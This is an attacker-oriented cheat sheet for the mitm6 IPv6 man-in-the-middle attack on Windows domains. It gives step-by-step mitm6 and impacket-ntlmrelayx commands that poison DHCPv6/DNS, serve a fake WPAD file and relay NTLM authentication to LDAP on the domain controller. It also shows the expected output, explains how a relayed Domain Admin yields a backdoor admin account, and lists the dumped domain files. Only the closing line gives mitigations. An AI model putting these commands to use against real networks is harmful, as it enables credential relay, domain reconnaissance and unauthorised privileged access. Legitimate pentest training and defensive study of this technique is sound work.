mitm6 - IPv6 MITM Attack - Cheat Sheet

Exploit Windows' default-enabled IPv6 to hijack DNS, redirect victims to the
attacker, and relay their NTLM auth to LDAP on the domain controller. No
existing foothold needed. Two terminals required - both must stay open.
Replace the placeholders (<...>) with your own values.


How it works (flow)
  1. Victim broadcasts a DHCPv6 request (Windows does this by default).
  2. mitm6 replies "I'm your IPv6 DNS server."
  3. Victim now sends all DNS queries through the attacker.
  4. Victim auto-queries DNS for wpad.<domain> to find a proxy config.
  5. mitm6 answers: "wpad = attacker's IP."
  6. Victim fetches /wpad.dat and silently auto-sends NTLM auth (no user click).
  7. ntlmrelayx catches the NTLM auth and relays it to LDAP on the DC.
  8. DC authenticates -> SUCCEED -> domain info dumped (and DA backdoor if the
     relayed user is a Domain Admin).


Step 1 - Start mitm6 (Tab 1 - keep open!)

Listens for DHCPv6 requests and poisons IPv6 DNS for the target domain only:

    mitm6 -d <domain>

    # Example:
    mitm6 -d force.local

-d targets only machines sending DHCPv6 requests for that domain (limits noise).


Step 2 - Start ntlmrelayx (Tab 2 - keep open!)

Waits for the relayed NTLM auth and forwards it to LDAP on the DC, dumping
domain info into a loot folder:

    impacket-ntlmrelayx -6 -t ldap://<dc-ip> -wh fakewpad.<domain> -l <lootdir>

    # Example:
    impacket-ntlmrelayx -6 -t ldap://192.168.50.10 -wh fakewpad.force.local -l loot

    -6                     listen on IPv6 (required for mitm6 relay)
    -t ldap://<dc-ip>      relay target = LDAP on the domain controller
    -wh fakewpad.<domain>  serve a fake WPAD file; victims querying wpad are
                           pointed here, triggering automatic NTLM auth
    -l <lootdir>           folder for the dumped domain info (name it anything)


Step 3 - What you'll see when it fires

    [*] (HTTP): Connection from ::ffff:<victim-ip> controlled, attacking ldap://<dc-ip>
    [*] (HTTP): Authenticating ... <DOMAIN>/<USER> against ldap://<dc-ip> SUCCEED
    [*] Enumerating relayed user's privileges...
    [*] Dumping domain info ...
    [*] Domain info dumped into lootdir!

You'll also see the victim request /wpad.dat - that's the WPAD trigger working.


Step 4 - Domain Admin vs Regular User (what changes)

  - Relayed user = Domain Admin: ntlmrelayx auto-creates a new user and adds it
    to Domain Admins (a backdoor admin). VERY noisy - creates a new AD object,
    may be disabled or alerted on.
  - Relayed user = Regular Domain User: relay still succeeds and dumps full
    domain info to the loot folder (no backdoor). Great for recon either way.


Step 5 - The loot folder

Created where you ran ntlmrelayx, named by -l. Full LDAP dump of the domain,
each category in .grep / .html / .json:

    domain_computers.*        machines + OS, hostname, SID, last logon
    domain_computers_by_os.html
    domain_groups.*           all AD groups
    domain_policy.*           password/lockout policy
    domain_trusts.*           domain trust relationships
    domain_users.*            all user accounts
    domain_users_by_group.html

The .html files open as readable tables - quick recon on every computer, user,
group, and policy without touching a single host directly.


Key idea: mitm6 needs no existing foothold - it exploits IPv6 being enabled by
default on Windows. Combined with WPAD, authentication happens automatically in
the background with no user interaction. The relay goes to LDAP (not SMB), so
SMB signing does NOT protect against this - mitigate by disabling IPv6 if
unused and blocking WPAD.
